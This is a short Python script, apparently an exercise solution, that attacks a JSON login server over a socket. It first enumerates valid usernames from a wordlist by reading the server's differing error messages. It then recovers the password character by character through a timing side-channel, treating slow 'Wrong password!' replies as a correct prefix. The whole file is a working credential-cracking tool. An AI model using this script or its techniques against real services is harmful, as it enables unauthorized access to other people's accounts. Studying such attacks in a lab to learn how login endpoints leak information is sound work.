import json
import socket
import sys
import time
from string import ascii_letters, digits


address = sys.argv[1]
port = int(sys.argv[2])
char_base = ascii_letters + digits


def hack_logins(client_socket, logins_file):
    for login_element in logins_file:
        json_string = {"login": login_element, "password": " "}
        message_text = json.dumps(json_string, indent=4)
        client_socket.send(message_text.encode())
        socket_response = json.loads(client_socket.recv(1024).decode())
        if socket_response['result'] == 'Wrong login!':
            continue
        elif socket_response['result'] in [
            'Wrong password!',
            'Exception happened during login'
        ]:
            return login_element


def hack_passwords(client_socket, char_base, start_password=''):
    for char in char_base:
        message = json.dumps({"login": login, "password": start_password+char})
        client_socket.send(message.encode())
        start = time.perf_counter()
        cli_response = json.loads(client_socket.recv(1024).decode())
        if cli_response['result'] == 'Wrong password!':
            end = time.perf_counter()
            total_time = end - start
            if total_time < 0.1:
                continue
            return hack_passwords(client_socket, char_base, start_password+char)
        # elif cli_response['result'] == 'Exception happened during login':
        #     start_password += char
        #     return hack_passwords(client_socket, char_base, start_password)
        elif cli_response['result'] == 'Connection success!':
            res = start_password + char
            return res


with socket.socket() as client_socket, \
        open('logins.txt', 'r') as logins_file:
    client_socket.connect((address, port))
    logins = logins_file.read().splitlines()

    login = hack_logins(client_socket, logins)
    password = hack_passwords(client_socket, char_base)
    print(json.dumps({"login": login, "password": password}, indent=4))
